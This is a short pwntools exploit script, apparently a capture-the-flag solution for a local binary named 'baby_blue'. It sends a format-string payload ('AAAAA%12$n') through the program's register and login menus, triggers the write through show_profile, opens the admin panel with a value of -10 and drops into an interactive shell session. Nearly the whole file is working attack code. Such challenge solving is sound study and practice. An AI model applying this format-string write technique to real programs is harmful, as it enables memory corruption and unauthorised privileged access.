#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './baby_blue')



if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *show_profile+101
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

pay1 = b"AAAAA%12$n"

# Send payload to register
io.sendlineafter(b"> ", b"1")
io.recv()
io.sendline(pay1)

# Sender payload to login
io.sendlineafter(b"> ", b"2")
io.recv()
io.sendline(pay1)

# Invoke show_profile to write
io.sendlineafter(b"> ", b"3")

# # Invoke admin_panel
io.sendlineafter(b"> ", b"4")


io.recv()
io.sendline(b"-10")

io.interactive()

